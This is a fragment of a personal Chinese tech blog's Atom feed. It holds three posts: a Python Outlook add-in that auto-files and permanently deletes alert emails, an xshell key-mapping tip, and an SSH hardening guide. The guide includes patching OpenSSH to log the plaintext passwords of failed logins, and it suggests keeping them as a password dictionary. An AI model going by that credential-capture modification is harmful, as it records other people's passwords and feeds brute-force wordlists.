<span class="title">OnItemAdd</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        handleItem(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove permanently when mail with specified sender arrived in Deleted box</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DeletedEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnItemAdd</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="comment"># print &#x27;DeletedEvent&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print &#x27;Deleted:&#x27;,item.Subject,&#x27;From:&#x27;,item.SenderName</span></span><br><span class="line">            <span class="keyword">if</span>(item.SenderName <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                item.Delete()</span><br><span class="line">        <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Delete&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted error.&quot;</span>,e</span><br><span class="line">        </span><br><span class="line"><span class="comment"># initialize each callback</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutlookAddin</span>:</span></span><br><span class="line">    _com_interfaces_ = [<span class="string">&#x27;_IDTExtensibility2&#x27;</span>]</span><br><span class="line">    _public_methods_ = []</span><br><span class="line">    _reg_clsctx_ = pythoncom.CLSCTX_INPROC_SERVER</span><br><span class="line">    _reg_clsid_ = <span class="string">&quot;&#123;0F47D9F3-598B-4d24-B7E3-92AC15ED27E2&#125;&quot;</span></span><br><span class="line">    _reg_progid_ = <span class="string">&quot;Python.Test.OutlookAddin&quot;</span></span><br><span class="line">    _reg_policy_spec_ = <span class="string">&quot;win32com.server.policy.EventHandlerPolicy&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnConnection</span>(<span class="params">self, application, connectMode, addin, custom</span>):</span></span><br><span class="line">        <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">        outlookApp=application</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;OnConnection&#x27;</span></span><br><span class="line">        <span class="comment"># ActiveExplorer may be none when started without a UI (eg, WinCE synchronisation)</span></span><br><span class="line">        activeExplorer = application.ActiveExplorer()</span><br><span class="line">        <span class="keyword">if</span> activeExplorer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registering button&#x27;</span></span><br><span class="line">            bars = activeExplorer.CommandBars</span><br><span class="line">            toolbar = bars.Item(<span class="string">&quot;Standard&quot;</span>)</span><br><span class="line">            item = toolbar.Controls.Add(Type=constants.msoControlButton, Temporary=<span class="literal">True</span>)</span><br><span class="line">            <span class="comment"># Hook events for the item</span></span><br><span class="line">            item = self.toolbarButton = DispatchWithEvents(item, ButtonEvent)</span><br><span class="line">            item.Caption=<span class="string">&quot;LogFilter&quot;</span></span><br><span class="line">            item.TooltipText = <span class="string">&quot;About&quot;</span></span><br><span class="line">            item.Enabled = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registered&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># get folder objs</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessing folders&#x27;</span></span><br><span class="line">        inbox        = application.Session.GetDefaultFolder(constants.olFolderInbox)</span><br><span class="line">        deleted      = application.Session.GetDefaultFolder(constants.olFolderDeletedItems)</span><br><span class="line">        log_bot = inbox.Folders[BotFolder]</span><br><span class="line">        log_usr = inbox.Folders[TargetFolder]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessed&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># filter bot folder in each start</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtering exists&#x27;</span></span><br><span class="line">        filterList=[]</span><br><span class="line">        <span class="keyword">for</span> iLog <span class="keyword">in</span> log_bot.Items:</span><br><span class="line">            filterList.append(iLog)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filterList:</span><br><span class="line">            handleItem(i)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtered&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># mesure Deleted after last filter</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaning Deleted&#x27;</span></span><br><span class="line">        dellist=[]</span><br><span class="line">        <span class="keyword">for</span> iToDel <span class="keyword">in</span> deleted.Items:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(iToDel.SenderName.encode(<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                    dellist.append(iToDel)</span><br><span class="line">            <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Error removing&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dellist:</span><br><span class="line">            i.Delete()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaned&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># hook up</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooking folders&#x27;</span></span><br><span class="line">        self.deletedItems = DispatchWithEvents(deleted.Items, DeletedEvent)</span><br><span class="line">        self.LogFilter = DispatchWithEvents(log_bot.Items, FolderEvent)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooked&#x27;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnDisconnection</span>(<span class="params">self, mode, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnDisconnection&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnAddInsUpdate</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnAddInsUpdate&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnStartupComplete</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnStartupComplete&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnBeginShutdown</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnBeginShutdown&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RegisterAddin</span>(<span class="params">klass</span>):</span></span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins&quot;</span>)</span><br><span class="line">    subkey = _winreg.CreateKey(key, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;CommandLineSafe&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">0</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;LoadBehavior&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">3</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;Description&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;FriendlyName&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UnregisterAddin</span>(<span class="params">klass</span>):</span></span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins\\&quot;</span> + klass._reg_progid_)</span><br><span class="line">    <span class="keyword">except</span> WindowsError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> win32com.server.register</span><br><span class="line">    win32com.server.register.UseCommandLine(OutlookAddin)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;--unregister&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        UnregisterAddin(OutlookAddin)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        RegisterAddin(OutlookAddin)</span><br></pre></td></tr></table></figure><p>另，outlookspy对查看com对象很有帮助。</p><p>许久不用md生疏了   O_o</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;天天收几百封告警邮件简直不能忍，刚好最近学py，用py写了个outlook插件练练手。&lt;br&gt;32位outlook，32位python2.7，32位pywin32库，以pywin32关于outlook的一个插件demo作基础改了改，实在不会vba。。。&lt;br&gt;去除了脚本里的敏感内容，顺带注释国际化了一下，代码如下：&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="python" scheme="https://badb100d.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>xshell设置ctrl+ ↑ ↓</title>
    <link href="https://badb100d.com/2015/04/08/2015-04-08/"/>
    <id>https://badb100d.com/2015/04/08/2015-04-08/</id>
    <published>2015-04-08T15:32:00.000Z</published>
    <updated>2015-04-08T15:32:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>由screen转tmux，使用的时候发现tmux的pane大小只能左右调节不能上下调节，各种搜索后发现是xshell的问题，<strong>xshell</strong>这个坑竟然不响应ctrl+up和ctrl+down。。。<br>在centos下terminal里cat，然后输入ctrl+up 回车 和 ctrl+down 回车，分别得到”\x1B[1;5A”和”\x1B[1;5B”，其中\x1B代指控制符ESC，可以通过Alt+27按出来。复制输出的字符串，xshell工具-&gt;选项-&gt;键盘和鼠标-&gt;编辑-&gt;新建，加入ctrl+up，类型选择发送字符串，粘贴刚才复制的对应字符串，完成。</p><p>抽空买个mbp吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由screen转tmux，使用的时候发现tmux的pane大小只能左右调节不能上下调节，各种搜索后发现是xshell的问题，&lt;strong&gt;xshell&lt;/strong&gt;这个坑竟然不响应ctrl+up和ctrl+down。。。&lt;br&gt;在centos下terminal里cat，然后输入ctrl+up 回车 和 ctrl+down 回车，分别得到”\x1B[1;5A”和”\x1B[1;5B”，其中\x1B代指控制符ESC，可以通过Alt+27按出来。复制输出的字符串，xshell工具-&amp;gt;选项-&amp;gt;键盘和鼠标-&amp;gt;编辑-&amp;gt;新建，加入ctrl+up，类型选择发送字符串，粘贴刚才复制的对应字符串，完成。&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="tools" scheme="https://badb100d.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>给VPS加ssh爆破记录</title>
    <link href="https://badb100d.com/2015/03/30/2015-03-30/"/>
    <id>https://badb100d.com/2015/03/30/2015-03-30/</id>
    <published>2015-03-30T14:31:00.000Z</published>
    <updated>2015-03-30T14:31:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="添加ssh密钥验证"><a href="#添加ssh密钥验证" class="headerlink" title="添加ssh密钥验证"></a>添加ssh密钥验证</h1><p>最近发现个人VPS的ssh日志中总是有很多不明IP的连接请求，天天爆破ssh也是够勤奋的。<br>为了防止某天VPS真被爆了先给ssh加个密钥认证，首先执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><img src="/2015/03/30/2015-03-30/ssh-keygen.jpg" class=""><p>将生成好的密钥对妥善保存(在生成中可选将私钥用口令加密)。<br>将公钥(id_rsa.pub)上传到VPS上，并将其内容添加到对应登录账户的~/.ssh/authorized_keys文件中，注意.ssh目录的权限最好是700(我的是755好像也行)，authorized_keys的权限必须是600或644。这里权限问题坑比较多，属主貌似没多大问题(我的登录账户不是root，但文件和目录的属主都是root)。<br>修改/etc/ssh/sshd_config文件，分别修改如下三项:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure><p>一般不用root登的话也设置一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>重启sshd服务<br>本地用Xshell添加刚才生成的私钥就可以连接VPS了(如果设置了加密口令则需要输入口令解密私钥)。<br>此时最基本的设置密钥登录就完成了，接下来我们修改open-ssh的代码来实现输出验证错误时的密码。</p><h1 id="修改ssh源码"><a href="#修改ssh源码" class="headerlink" title="修改ssh源码"></a>修改ssh源码</h1><p>首先切换到一个临时目录执行apt-get source ssh，执行完后直接有一个openssh-6.6p1/ 目录和几个压缩包(我的VPS装的是DigitalOcean官方提供的Ubuntu镜像)，进入源码目录后首先写个patch:</p><img src="/2015/03/30/2015-03-30/patch-shot.jpg" class=""><p>用ssh工程内的logit来写SYSLOG。写完patch后先</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch --dry-run &lt;sshlog.patch</span><br></pre></td></tr></table></figure><p>看是否有错误，没有错误的话就可以直接patch了。<br>到这里建议先备份一下/etc/ssh文件夹，再建个VPS的快照以防悲剧。。。<br>在源码目录执行配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/man</span><br></pre></td></tr></table></figure><p>如果出错就安装缺少的软件包，下面是我安装时缺少的软件包:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install zlib1g zlib1g.dev openssl libssl-dev</span><br></pre></td></tr></table></figure><p>(以上是ubuntu非主流命名的包名。。)<br>其中安libssl-dev的时候加了个 –fix-missing参数才没有出错。<br>configure顺利完成后执行make和make install，之后重启sshd服务(digitalocean的ubuntu下直接重启ssh)。<br>重启后先别急着退出，在当前会话下对比备份的ssh配置和新生成的ssh配置的不同，根据需要更改一下(这里最好不要改新生成的密钥，改了以后可能就要恢复快照了。。。)，然后新开几个会话看是否能成功连上VPS。</p><h1 id="更改账户认证策略"><a href="#更改账户认证策略" class="headerlink" title="更改账户认证策略"></a>更改账户认证策略</h1><p>以上完成后还要再修改一些配置，先在shadow里把root禁了(密码前加个!号)，之后重新修改sshd_config配置，主要注意以下几个：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile   %h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>注意下面这行实际上是针对所有其他账户的，<br>我的VPS上就2个账户，一个root不允许登录并且把shadow废了，<br>另一个常用账户在sudoers里，sudoers组登录策略另行配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>在文件的最后(貌似Match有要求)添加如下内容: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Match Group sudo    #这里可能组名会不一样，wheel、sudoer什么的视情况而定</span><br><span class="line">PasswordAuthentication no  #禁止sudoers密码登录</span><br></pre></td></tr></table></figure><p>经过如上配置后只要用户名在sudoer里VPS是不允许密码登录的。<br>此时如果恰巧有人在爆破你的VPS你可以通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -F /var/log/auth.log | grep sshlog</span><br></pre></td></tr></table></figure><p>看到，有些主机的日志可能在/var/log/secure内，具体情况参照syslog.conf或rsyslog.conf的配置。</p><img src="/2015/03/30/2015-03-30/brute-log.jpg" class=""><p>感受到了世界深深的恶意。。。</p><p>可以写个脚本或程序来定期提取这些密码记录，送上门的字典不要白不要。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;添加ssh密钥验证&quot;&gt;&lt;a href=&quot;#添加ssh密钥验证&quot; class=&quot;headerlink&quot; title=&quot;添加ssh密钥验证&quot;&gt;&lt;/a&gt;添加ssh密钥验证&lt;/h1&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="vps" scheme="https://badb100d.com/tags/vps/"/>
    
  </entry>
  
</feed>
